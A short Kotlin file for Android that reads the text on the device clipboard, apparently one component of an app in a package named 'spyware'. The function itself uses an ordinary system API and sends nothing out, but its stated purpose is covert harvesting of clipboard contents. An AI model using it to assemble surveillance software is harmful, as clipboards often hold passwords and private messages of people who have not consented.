package com.mhl.spyware

import android.annotation.SuppressLint
import android.content.ClipboardManager
import android.content.Context
class GetClipboard(private val context: Context) {


    @SuppressLint("SuspiciousIndentation")
    fun getClipboardData(): String {
        val clipboardManager =
            context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clipData = clipboardManager.primaryClip
        if (clipData != null && clipData.itemCount > 0) {
            val clipItem = clipData.getItemAt(0)
            val text = clipItem.text.toString()

            return if (text.isNotEmpty()) {
                text
            } else {
                "Clipboard contains no text data."
            }
        }

        return "Clipboard is empty or contains non-text data."
    }



}

